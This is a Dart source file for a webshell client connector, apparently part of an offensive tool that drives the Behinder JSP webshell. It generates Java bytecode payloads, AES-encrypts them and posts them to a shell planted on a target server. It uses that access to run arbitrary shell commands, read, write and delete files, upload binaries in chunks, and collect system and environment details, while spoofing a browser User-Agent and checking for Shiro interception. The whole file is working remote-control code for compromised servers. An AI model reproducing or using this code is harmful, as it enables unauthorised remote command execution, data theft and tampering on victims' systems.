import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;
import 'package:http/http.dart' as http;

import '../core/crypto/behinder_crypto.dart';
import '../core/crypto/jvm_bytecode.dart';
import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'jsp_webapp_path.dart';
import 'shell_connector.dart';
import 'shell_exec_connector.dart';

/// `JspBehinderConnectorV2`：动态字节码冰蝎连接器。
///
/// 与 V1 的核心区别：
///   - V1 使用预编译的 `jsp_agent_M.b64`（通用 M.class stub）+ 第二行加密参数
///   - V2 使用 [BehinderPayloadFactory] 在 Dart 端动态生成 Java 字节码，命令和参数
///     直接嵌入类的常量池，无需第二行参数
///
/// POST body 格式（单行）：
///   `base64(AES(generated_class_bytes))`
///
/// 服务端 JSP shell 不变（`jsp_behinder.jsp`）：
///   读取第一行 → base64 解码 → AES 解密 → defineClass → newInstance → equals(pageContext)
///
/// 密钥派生：与 V1 一致，通过 [BehinderCrypto.deriveKey] 从密码派生 16 字节 AES key。
class JspBehinderConnectorV2 extends ShellConnector {
  JspBehinderConnectorV2(super.webshell);

  late final http.Client _client = http.Client();
  final Map<String, String> _cookies = {};
  bool _sessionEstablished = false;

  String get _key => BehinderCrypto.deriveKey(webshell.password);

  @override
  Set<ConnectorCapability> get capabilities => const {
        ConnectorCapability.codeExec,
        ConnectorCapability.shellExec,
        ConnectorCapability.fileRead,
        ConnectorCapability.fileWrite,
      };

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;
  String? _lastPingDiagnostic;

  // -----------------------------------------------------------------------
  // HTTP helpers
  // -----------------------------------------------------------------------

  void _updateCookies(http.Response response) {
    final raw = response.headers['set-cookie'];
    if (raw == null) return;
    final part = raw.split(';').first.trim();
    final eq = part.indexOf('=');
    if (eq > 0) {
      _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
    }
  }

  Future<void> _ensureSession() async {
    if (_sessionEstablished) return;
    try {
      final uri = Uri.parse(webshell.url);
      final r = await _client.get(uri).timeout(const Duration(seconds: 10));
      _updateCookies(r);
    } catch (_) {}
    _sessionEstablished = true;
  }

  Map<String, String> _requestHeaders() {
    final h = <String, String>{
      'Content-Type': 'application/octet-stream',
      'Accept': '*/*',
      'User-Agent':
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    };
    if (_cookies.isNotEmpty) {
      h['Cookie'] =
          _cookies.entries.map((e) => '${e.key}=${e.value}').join('; ');
    }
    return h;
  }

  /// AES-128-ECB 加密 → base64（请求加密，与 V1 一致）
  String _aesEncryptBase64(Uint8List plain) {
    final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
    final encrypted = encrypter.encryptBytes(plain);
    return base64.encode(encrypted.bytes);
  }

  // -----------------------------------------------------------------------
  // Core: send a generated payload class
  // -----------------------------------------------------------------------

  /// 生成 payload 类，AES 加密 + base64，作为单行 POST body 发送。
  Future<String> _sendPayload(
    GeneratedPayload payload, {
    Duration timeout = const Duration(seconds: 60),
  }) async {
    try {
      await _ensureSession();

      // 加密 class 字节码
      final b64Payload = _aesEncryptBase64(payload.classBytes)
          .replaceAll('\n', '')
          .replaceAll('\r', '');
      final bodyBytes = utf8.encode(b64Payload);

      final uri = Uri.parse(webshell.url);
      final headers = _requestHeaders();

      final response = await _client
          .post(uri, headers: headers, body: bodyBytes)
          .timeout(timeout);

      _updateCookies(response);

      if (response.statusCode == 200) {
        final body = decodeWithFallback(response.bodyBytes);

        // 检查 Shiro 拦截
        if (body.contains('rememberMe=deleteMe') ||
            response.headers['set-cookie']
                ?.contains('rememberMe=deleteMe') ==
                true) {
          return '[Error] 内存马未响应 (被 Shiro 重定向/拦截)';
        }

        // 多层解密尝试
        final decrypted = BehinderCrypto.tryDecryptJsp(body, _key) ??
            BehinderCrypto.tryDecryptJspWithMagic(
                response.bodyBytes, _key) ??
            BehinderCrypto.tryDecryptLegacyMatrix(body, _key);
        if (decrypted != null) {
          return BehinderCrypto.extractResponse(decrypted);
        }
        return body;
      }

      if (response.statusCode == 302 || response.statusCode == 301) {
        final location = response.headers['location'] ?? 'unknown';
        return '[HTTP ${response.statusCode}] 重定向 -> $location\n内存马可能未生效，请求被拦截到登录页面。';
      }

      final body = decodeWithFallback(response.bodyBytes);
      final snippet =
          body.length > 4096 ? '${body.substring(0, 4096)}...' : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  // -----------------------------------------------------------------------
  // Payload factory (lazy, shared across all requests)
  // -----------------------------------------------------------------------

  BehinderPayloadFactory? _factory;

  BehinderPayloadFactory get _f =>
      _factory ??= BehinderPayloadFactory(key: _key);

  // -----------------------------------------------------------------------
  // ShellConnector implementation
  // -----------------------------------------------------------------------

  @override
  Future<bool> ping() async {
    try {
      final payload = _f.buildPing();
      final r =
          await _sendPayload(payload).timeout(const Duration(seconds: 30));
      if (r.contains('MATRIX_JSP_PING')) {
        _lastPingDiagnostic = null;
        return true;
      }
      if (r.trim().isEmpty) {
        _lastPingDiagnostic =
            'HTTP 200 但响应体为空。请核对：① JSP shell 内 AES 密钥与 Matrix「密码」一致；'
            '② JSP shell 已部署到目标（jsp_behinder.jsp）；'
            '③ 目标未拦截 application/octet-stream POST。';
      } else {
        _lastPingDiagnostic = r;
      }
      return false;
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  static bool _hasNonAscii(String s) => s.codeUnits.any((c) => c > 127);

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final String script;
    if (workingDir.isNotEmpty && workingDir.startsWith('/')) {
      if (_hasNonAscii(workingDir)) {
        final b64 = base64.encode(utf8.encode(workingDir));
        script = '_wd=\$(echo ${_sq(b64)}|base64 -d) && cd "\$_wd" && $cmd';
      } else {
        script = 'cd ${_sq(workingDir)} && $cmd';
      }
    } else {
      script = ShellExecConnector.quoteRmOperandIfNeeded(cmd);
    }
    final payload = _f.buildExec(script);
    final r = await _sendPayload(payload);
    return r.trim();
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await _sendPayload(_f.buildPwd())).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<String?> getShellScriptDir() =>
      JspWebappPath.resolveJspAgentShellScriptDir(
        supportsShellExec: supportsShellExec,
        shellUrl: webshell.url,
        loadSysinfo: getSystemInfo,
        exec: executeCommand,
      );

  List<FileEntry> _parseLsOutput(String result) {
    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final result = await _sendPayload(_f.buildLs(path));
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }
    return _parseLsOutput(result);
  }

  @override
  Future<String> readFile(String path) async {
    // Use buildCat for text files — it returns base64-decoded content via JSON
    final r = await _sendPayload(_f.buildCat(path));
    if (r.startsWith('[文件不存在')) return r;
    return r;
  }

  @override
  Future<bool> writeFile(String path, String content) {
    final dataB64 = base64.encode(utf8.encode(content));
    return _sendPayload(_f.buildWrite(path, dataB64))
        .then((r) => r.trim() == '1');
  }

  @override
  Future<bool> deleteFile(String path) async {
    final r = await _sendPayload(_f.buildRm(path));
    return r.trim() == '1';
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    final b64Path = base64.encode(utf8.encode(path));
    final cmd =
        "_p=\$(echo ${_sq(b64Path)} | base64 -d) && cat \"\$_p\" 2>/dev/null | base64 -w0 2>/dev/null || cat \"\$_p\" 2>/dev/null | base64";
    final result = await executeCommand(cmd);
    final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
    if (b64.isEmpty || b64.startsWith('[')) {
      throw Exception('无法读取文件: $b64');
    }
    return base64.decode(b64);
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) =>
      writeFileBinaryWithProgress(path, bytes, (_, __) {});

  /// 每块最大原始字节数。块会被 base64 编码后嵌入 class 常量池；
  /// 超过 ~42KB 会自动拆分到多个常量池条目，运行时拼接。
  static const _kWpartChunkSize = 256 * 1024;

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    onProgress(0, total);

    if (total == 0) {
      final r = await _sendPayload(_f.buildWpart(path, Uint8List(0), 0, 1));
      return r.trim() == '1';
    }

    final blockSize = _kWpartChunkSize;
    final blockCount = (total + blockSize - 1) ~/ blockSize;

    for (var bi = 0; bi < blockCount; bi++) {
      final start = bi * blockSize;
      final end = (start + blockSize).clamp(0, total);
      final chunk = bytes.sublist(start, end);

      final r = await _sendPayload(
        _f.buildWpart(path, chunk, bi, blockSize),
      );
      if (r.trim() != '1') {
        await _sendPayload(_f.buildWclose(path)); // clean up session
        return false;
      }

      onProgress(end, total);
    }
    // Close the session-cached RAF
    final cr = await _sendPayload(_f.buildWclose(path));
    return cr.trim() == '1';
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    final result = await _sendPayload(_f.buildSysInfo());
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = decodeWithFallback(
            base64.decode(line.substring(0, idx).trim()),
          );
          final val = decodeWithFallback(
            base64.decode(line.substring(idx + 1).trim()),
          );
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    final safePath = path.replaceAll("'", "'\"'\"'");
    final result = await executeCommand(
      "ls -a '$safePath' 2>/dev/null || echo ''",
    );
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final name in result.trim().split('\n')) {
      if (name == '.' || name.isEmpty) continue;
      out.add((name: name, isDir: name.endsWith('/') ||
          !name.contains('.')));
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async {
    final r = await _sendPayload(_f.buildHome());
    return r.trim();
  }

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await _sendPayload(_f.buildEnvNames());
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }
}
